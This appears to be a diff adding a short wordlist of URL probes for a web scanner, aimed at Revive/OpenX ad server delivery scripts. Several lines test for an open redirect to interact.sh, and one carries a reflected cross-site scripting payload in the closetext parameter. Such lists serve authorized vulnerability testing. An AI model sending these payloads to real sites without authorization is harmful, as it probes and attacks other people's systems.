@@ -1,0 +1,9 @@
+/www/delivery/afr.php?refresh=10000&\
+/ads/www/delivery/lg.php?dest=http://interact.sh
+/adserve/www/delivery/lg.php?dest=http://interact.sh
+/adserver/www/delivery/lg.php?dest=http://interact.sh
+/openx/www/delivery/lg.php?dest=http://interact.sh
+/revive/www/delivery/lg.php?dest=http://interact.sh
+/www/delivery/lg.php?dest=http://interact.sh
+
+/www/delivery/al.php?zoneid=1&layerstyle=geocities&closetext=%3Cscript%3Ealert(document.domain);%3C/script%3E
